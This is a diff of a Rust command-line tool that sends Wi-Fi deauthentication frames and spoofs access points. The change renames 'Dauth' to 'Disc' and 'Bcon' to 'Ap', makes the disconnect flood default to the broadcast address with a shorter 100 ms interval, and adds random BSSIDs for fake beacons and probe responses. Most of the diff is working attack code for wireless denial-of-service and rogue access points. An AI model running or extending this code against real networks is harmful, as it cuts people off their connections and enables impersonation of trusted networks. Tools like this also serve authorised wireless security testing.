@@ -1,3 +1,9 @@
+use airctl::{
+    af_eth::{self, FrameName},
+    helper::channel_to_freq,
+    nl_gen,
+};
+use rand::Rng;
 use std::{
     sync::{
         Arc,
@@ -5,12 +11,6 @@ use std::{
     },
     thread,
     time::Duration,
-};
-
-use airctl::{
-    af_eth::{self, FrameName},
-    helper::channel_to_freq,
-    nl_gen,
 };
 
 use clap::{Args, Parser, Subcommand};
@@ -26,12 +26,12 @@ pub struct Cli {
 pub struct WirelessArgs {
     #[arg(short, long)]
     pub interface: String,
-    #[arg(short, long)]
+    #[arg(short = 'f', long)]
     pub channel: u16,
     #[arg(short, long)]
-    pub target: Option<String>,
+    pub client: Option<String>,
     #[arg(short, long)]
-    pub bssid: String,
+    pub ap: Option<String>,
     #[arg(short, long)]
     pub gap: Option<u64>,
     #[arg(short, long)]
@@ -40,11 +40,11 @@ pub struct WirelessArgs {
 
 #[derive(Subcommand, Debug)]
 pub enum Commands {
-    Dauth {
+    Disc {
         #[command(flatten)]
         args: WirelessArgs,
     },
-    Bcon {
+    Ap {
         #[command(flatten)]
         args: WirelessArgs,
         #[arg(short, long)]
@@ -59,24 +59,29 @@ fn main() {
     let command = cli.command;
 
     match command {
-        Commands::Dauth {
+        Commands::Disc {
             args:
                 WirelessArgs {
                     interface,
                     channel,
-                    target,
-                    bssid,
+                    client,
+                    ap,
                     gap,
                     repeat,
                 },
         } => {
-            let target = match target.as_deref() {
+            let client = match client.as_deref() {
                 Some(target) => target,
-                None => panic!("No target specified"),
+                None => "FF:FF:FF:FF:FF:FF",
             };
 
-            let target = parse_mac(&target);
-            let bssid = parse_mac(&bssid);
+            let ap = match ap.as_deref() {
+                Some(target) => target,
+                None => panic!("AP Required!"),
+            };
+
+            let client_vec = parse_mac(&client);
+            let ap_vec = parse_mac(&ap);
 
             let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
             af_ctrl.sock_bind();
@@ -96,39 +101,42 @@ fn main() {
             match (gap, repeat) {
                 (None, Some(r)) => {
                     for _ in 0..r {
-                        af_ctrl.deauth(target, bssid);
-                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
-                        thread::sleep(Duration::from_millis(500));
+                        af_ctrl.disconnect(client_vec, ap_vec);
+                        println!("Disconnect Packet sent: {:?} -> {:?}", ap, client);
+                        thread::sleep(Duration::from_millis(100));
                     }
                 }
                 (Some(g), Some(r)) => {
                     for _ in 0..r {
-                        af_ctrl.deauth(target, bssid);
-                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
+                        af_ctrl.disconnect(client_vec, ap_vec);
+                        println!("Disconnect Packet sent: {:?} -> {:?}", ap, client);
                         thread::sleep(Duration::from_millis(g));
                     }
                 }
                 _ => loop {
-                    af_ctrl.deauth(target, bssid);
-                    println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
-                    thread::sleep(Duration::from_millis(500));
+                    af_ctrl.disconnect(client_vec, ap_vec);
+                    println!("Disconnect Packet sent: {:?} -> {:?}", ap, client);
+                    thread::sleep(Duration::from_millis(100));
                 },
             }
         }
-        Commands::Bcon {
+        Commands::Ap {
             args:
                 WirelessArgs {
                     interface,
                     channel,
-                    target: _,
-                    bssid,
+                    client: _,
+                    ap,
                     gap,
                     repeat,
                 },
 
             ssid,
         } => {
-            let bssid = parse_mac(&bssid);
+            let ap = match ap.as_deref() {
+                Some(target) => parse_mac(&target),
+                None => random_bssid(),
+            };
 
             let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
             af_ctrl.sock_bind();
@@ -161,7 +169,7 @@ fn main() {
                         Some((_, packet_info, _)) => match packet_info.frame_name {
                             FrameName::ProbeRequest => {
                                 af_ctrl2.prope_responce(
-                                    bssid,
+                                    ap,
                                     parse_mac(&packet_info.transmitter),
                                     &ssid_clone,
                                     channel,
@@ -181,9 +189,8 @@ fn main() {
             match (gap, repeat) {
                 (None, Some(r)) => {
                     for _ in 0..r {
-                        af_ctrl.beacons(bssid, &ssid, channel, seq_counter);
+                        af_ctrl.gen_fap(ap, &ssid, channel, seq_counter);
 
-                        // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
                         thread::sleep(Duration::from_millis(100));
                         seq_counter = (seq_counter + 1) % 4096;
                     }
@@ -191,16 +198,14 @@ fn main() {
                 }
                 (Some(g), Some(r)) => {
                     for _ in 0..r {
-                        af_ctrl.beacons(bssid, &ssid, channel, seq_counter);
-                        // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
+                        af_ctrl.gen_fap(ap, &ssid, channel, seq_counter);
                         thread::sleep(Duration::from_millis(g));
                         seq_counter = (seq_counter + 1) % 4096;
                     }
                     terminal_running.store(false, Ordering::Relaxed);
                 }
                 _ => loop {
-                    af_ctrl.beacons(bssid, &ssid, channel, seq_counter);
-                    // println!("Becons Packet sent: {:?} -> {:?}", bssid, ssid);
+                    af_ctrl.gen_fap(ap, &ssid, channel, seq_counter);
                     thread::sleep(Duration::from_millis(100));
                     seq_counter = (seq_counter + 1) % 4096;
                 },
@@ -225,5 +230,14 @@ fn parse_mac(s: &str) -> [u8; 6] {
             .map_err(|_| format!("Invalid MAC byte: {part}"))
             .unwrap();
     }
+    mac
+}
+
+fn random_bssid() -> [u8; 6] {
+    let mut mac: [u8; 6] = rand::rng().random();
+
+    // Locally administered, unicast MAC address.
+    mac[0] = (mac[0] & 0xFC) | 0x02;
+
     mac
 }
